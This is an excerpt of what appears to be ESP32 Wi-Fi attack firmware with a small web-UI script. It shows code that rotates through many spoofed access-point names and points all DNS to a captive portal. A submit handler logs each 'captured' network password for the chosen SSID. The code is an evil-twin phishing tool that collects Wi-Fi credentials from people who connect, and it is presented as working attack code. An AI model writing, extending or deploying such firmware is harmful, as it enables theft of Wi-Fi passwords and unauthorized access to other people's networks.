...
async function startStatusUpdates() {
    setInterval(async () => {
        try {
            ...
            updateMassSpoofingUI(); // NEW: Update mass spoofing UI
...
void loop() {
  ...
  if (mass_spoofing_active && massSpoofingCount > 0 && millis() - lastSpoofingChangeTime >= SPOOFING_CHANGE_INTERVAL) {
    ...
    // Disconnect current AP and start new one
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    delay(50); // Small delay for stability
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(currentSpoofingSSID.c_str());
    dnsServer.start(DNS_PORT, "*", apIP);

    if (appSettings.enableDebugLogs) Serial.println("[SPOOF] Switched AP to: " + currentSpoofingSSID);
...
void handleApiMassSpoofing() { // MODIFIED
  if (webServer.hasArg("plain")) {
    ...
    if (massSpoofingCount > 0) {
      ...
      delay(50);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP(massSpoofingSSIDs[currentSpoofingIndex].c_str());
      dnsServer.start(DNS_PORT, "*", apIP);

      if (appSettings.enableDebugLogs) Serial.println("[SPOOF] Mass SSID Spoofing started with " + String(massSpoofingCount) + " SSIDs. Current: " + massSpoofingSSIDs[currentSpoofingIndex]);
      webServer.send(200, "application/json", "{\"success\": true, \"message\": \"Mass spoofing started\", \"mass_spoofing_active\": true}");
    } else {
      mass_spoofing_active = false;
...
void handleApiStopMassSpoofing() { // NEW
    ...
    webServer.send(200, "application/json", "{\"success\": true, \"message\": \"Mass spoofing stopped\", \"mass_spoofing_active\": false}");
}
...
void handleCaptivePortalSubmit() {
  if (webServer.hasArg("password")) {
    ...
    snprintf(logBuffer, sizeof(logBuffer), "Captured for SSID: %s, Password: %s (Time: %lus)\n",
             _selectedNetwork.ssid.c_str(), capturedPassword.c_str(), millis() / 1000);
